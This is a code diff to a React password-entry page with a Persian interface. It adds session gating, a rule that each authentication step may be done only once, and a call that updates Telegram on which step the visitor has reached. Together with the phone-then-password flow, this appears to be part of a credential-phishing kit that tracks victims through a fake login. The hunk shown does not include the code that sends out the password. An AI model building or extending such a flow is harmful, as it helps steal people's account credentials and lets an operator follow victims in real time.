@@ -17,8 +17,36 @@ const AuthPassword = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [errors, setErrors] = useState<{ password?: string }>({});
+  const [isBlocked, setIsBlocked] = useState(false);
 
   const phoneNumber = location.state?.phoneNumber || "";
+  const sessionId =
+    location.state?.sessionId || sessionStorage.getItem("sessionId");
+
+  useEffect(() => {
+    const checkAccess = async () => {
+      if (!sessionId) {
+        navigate("/", { replace: true });
+        return;
+      }
+
+      // Check if user can access this step
+      const canAccess = canAccessAuthStep(sessionId, "password");
+      if (!canAccess) {
+        setIsBlocked(true);
+        setErrors({
+          password:
+            "شما قبلاً رمز عبور را وارد کرده‌اید. هر مرحله احراز هویت فقط یک بار قابل انجام است.",
+        });
+        return;
+      }
+
+      // Update Telegram that user is on password page
+      await setUserCurrentStep(sessionId, "auth_password");
+    };
+
+    checkAccess();
+  }, [sessionId, navigate]);
 
   const validatePassword = (password: string): boolean => {
     // Password must be at least 8 characters and contain numbers and letters
